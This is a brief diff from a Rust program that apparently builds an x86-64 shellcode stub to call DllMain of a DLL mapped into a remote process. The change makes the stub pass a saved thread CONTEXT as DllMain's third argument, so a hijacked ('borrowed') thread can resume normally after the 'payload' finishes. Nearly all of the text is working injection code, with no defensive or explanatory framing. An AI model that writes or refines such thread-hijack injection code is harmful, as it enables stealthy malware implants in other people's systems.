@@ -1029,7 +1029,11 @@ fn main() {
         s.extend_from_slice(&[0x48, 0xB9]);
         s.extend_from_slice(&remote_base.to_le_bytes());
         s.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
-        s.extend_from_slice(&[0x45, 0x33, 0xC0]);
+        // Third DllMain argument = the saved CONTEXT. The payload reloads it
+        // when the session ends, so the borrowed thread goes back to its wait
+        // instead of being left inside the payload image.
+        s.extend_from_slice(&[0x49, 0xB8]);
+        s.extend_from_slice(&(stub_addr + 0x200).to_le_bytes());
         s.extend_from_slice(&[0x48, 0x83, 0xE4, 0xF0]);
         s.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]);
         s.extend_from_slice(&[0x48, 0xB8]);
